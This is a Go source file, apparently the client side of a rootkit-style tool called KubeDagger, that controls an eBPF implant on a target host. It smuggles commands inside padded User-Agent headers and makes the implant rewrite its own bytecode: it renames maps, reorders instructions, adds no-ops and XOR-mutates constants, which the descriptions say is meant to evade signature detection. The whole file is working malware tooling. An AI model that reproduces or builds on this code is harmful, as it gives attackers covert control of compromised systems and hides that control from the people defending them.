package polymorph

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type PolymorphResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, seed, output string) error {
	result := &PolymorphResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"randomize_map_names",
			"rename BPF map FDs with randomized identifiers to evade signature detection",
			"polymorph_randomize_maps",
		},
		{
			"reorder_instructions",
			"reorder independent BPF instructions while preserving semantics",
			"polymorph_reorder_insns",
		},
		{
			"insert_semantic_nops",
			"insert semantically neutral instructions (mov r0,r0; xor r1,r1,r1) to change bytecode hash",
			"polymorph_insert_nops",
		},
		{
			"mutate_constants",
			"XOR constants with seed-derived key and add compensating XOR at use sites",
			"polymorph_mutate_consts",
		},
		{
			"reload_programs",
			"unload current BPF programs and reload with polymorphic variants",
			"polymorph_reload",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + seed
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/polymorph", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
